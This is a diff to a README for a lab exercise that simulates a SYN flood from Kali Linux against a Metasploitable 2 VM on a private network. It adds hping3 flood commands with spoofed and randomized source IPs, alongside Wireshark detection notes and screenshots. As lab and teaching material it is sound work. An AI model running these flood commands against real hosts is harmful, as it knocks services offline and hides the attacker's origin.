@@ -6,7 +6,7 @@ Simulate a simple DDoS (SYN flood) attack on a Metasploitable 2 VM from Kali Lin
 
 ---
 
-## 🖥️ Lab Setup
+## 💽 Lab Setup
 
 * **Attacker**: Kali Linux (running `hping3`)
 * **Target**: Metasploitable 2
@@ -15,17 +15,9 @@ Simulate a simple DDoS (SYN flood) attack on a Metasploitable 2 VM from Kali Lin
 
 ---
 
-## 🔧 Network Configuration
+## Detailed Methodology
 
-* **Kali IP**: 192.168.56.101
-* **Metasploitable IP**: 192.168.56.102
-* **Interface monitored in Wireshark**: `eth0`
-
----
-
-## 🚀 Attack Command
-
-Using `hping3` to flood SYN packets:
+### 1. Basic SYN Flood
 
 ```bash
 hping3 -S --flood -V 192.168.56.102
@@ -35,7 +27,25 @@ hping3 -S --flood -V 192.168.56.102
 * `--flood`: send packets as fast as possible
 * `-V`: verbose mode
 
-> 📌 Tip: Run as root for full functionality
+### 2. SYN Flood with Spoofed Source IP
+
+```bash
+hping3 -S 192.168.56.102 -a 10.10.10.10 -p 80 --flood
+```
+
+* `-a`: spoofed IP address
+* `-p`: destination port
+
+### 3. SYN Flood with Randomized Source IPs & Payload
+
+```bash
+hping3 -S 192.168.56.102 -d 120 -p 80 --flood --rand-source
+```
+
+* `-d`: data size of each packet (in bytes)
+* `--rand-source`: use random source IPs
+
+> 📌 Tip: Run all commands as root for full functionality
 
 ---
 
@@ -43,7 +53,7 @@ hping3 -S --flood -V 192.168.56.102
 
 * CPU usage on Metasploitable 2 spiked
 * Network became unresponsive to ping after sustained SYN flooding
-* Wireshark captured a high volume of duplicate SYN packets
+* Wireshark captured high volume of SYN packets, some with spoofed or random IPs
 
 ---
 
@@ -66,21 +76,23 @@ tcp.analysis.flags
 ## 📂 Files
 
 * `wireshark-captures/ddos-attack.pcapng`: Full capture of SYN flood
-* `scripts/hping3_ddos.sh`: Simple bash script to run attack
+* `scripts/hping3_ddos.sh`: Simple bash script to run attack variants
 
 ---
 
 ## 📸 Screenshots Collected
 
-* Kali terminal running `hping3`
-* Wireshark graph showing spike in traffic
-* `top` command output from Metasploitable 2
+* ![Kali attack terminal](../screenshots/kali-attack.png)
+* ![Metasploitable CPU usage](../screenshots/metasploitable-target.png)
+* ![Wireshark SYN flood](../screenshots/wireshark-analysis.png)
+* ![Random IP SYN packets](../screenshots/random-source-syn.png)
+* ![Spoofed IP attack](../screenshots/spoofed-ip-syn.png)
 
 ---
 
 ## ✅ Summary
 
-This simulation demonstrates how SYN flood attacks generate abnormal TCP traffic that can be identified using packet inspection tools like Wireshark. All actions were performed in an ethical, isolated test lab.
+This simulation demonstrates how different types of SYN flood attacks (including spoofed and randomized source IPs) generate abnormal traffic that can be identified using packet inspection tools like Wireshark. All actions were performed in an ethical, isolated test lab.
 
 ---
 
